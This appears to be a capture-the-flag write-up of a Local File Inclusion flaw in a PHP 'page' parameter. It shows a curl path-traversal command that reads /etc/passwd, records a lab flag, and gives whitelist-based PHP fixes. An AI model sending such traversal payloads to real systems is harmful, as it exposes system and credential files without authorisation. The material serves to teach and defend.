# Local File Inclusion (LFI) Vulnerability

## 🎯 Overview
This vulnerability demonstrates a Local File Inclusion (LFI) attack vector where the application fails to properly validate file paths in the 'page' parameter, allowing access to system files.

## 🔍 Vulnerability Details
- **Endpoint**: `index.php?page=`
- **Parameter**: `page`
- **Attack Vector**: Path Traversal
- **Target File**: `/etc/passwd`

## ⚔️ Exploitation Process

### Attack Method
```bash
# Path traversal to access system files
curl "http://x.x.x.x/?page=../../../../../../../etc/passwd"
```

### Attack Result
**Flag**: b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0

## 🛡️ Security Issues Identified
1. Insufficient input validation
2. No path sanitization
3. Dangerous file system access
4. Missing access controls
5. Improper file path handling

## 🔒 Recommended Security Fixes

### 1. Implement Path Validation
```php
function validatePath($path) {
    // Whitelist allowed paths
    $allowed = ['home', 'about', 'contact'];
    return in_array($path, $allowed);
}
```

### 2. Security Measures Checklist
- [ ] Implement strict input validation
- [ ] Use whitelisting for allowed files/paths
- [ ] Remove direct file system access
- [ ] Implement proper access controls
- [ ] Use secure file handling functions

### 3. Additional Security Controls
```php
// Example secure implementation
public function getPage($page) {
    $whitelist = [
        'home' => 'home.php',
        'about' => 'about.php',
        'contact' => 'contact.php'
    ];
    
    if (!isset($whitelist[$page])) {
        return 'error.php';
    }
    
    return $whitelist[$page];
}
```

## 📚 Additional Resources
- [OWASP File Inclusion Prevention](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [CWE-98: Improper Control of Filename for Include/Require Statement](https://cwe.mitre.org/data/definitions/98.html)
- [PHP Security Best Practices](https://www.php.net/manual/en/security.filesystem.php)

## ⚠️ Disclaimer
This documentation is for educational purposes only. Always obtain proper authorization before testing security measures on any system.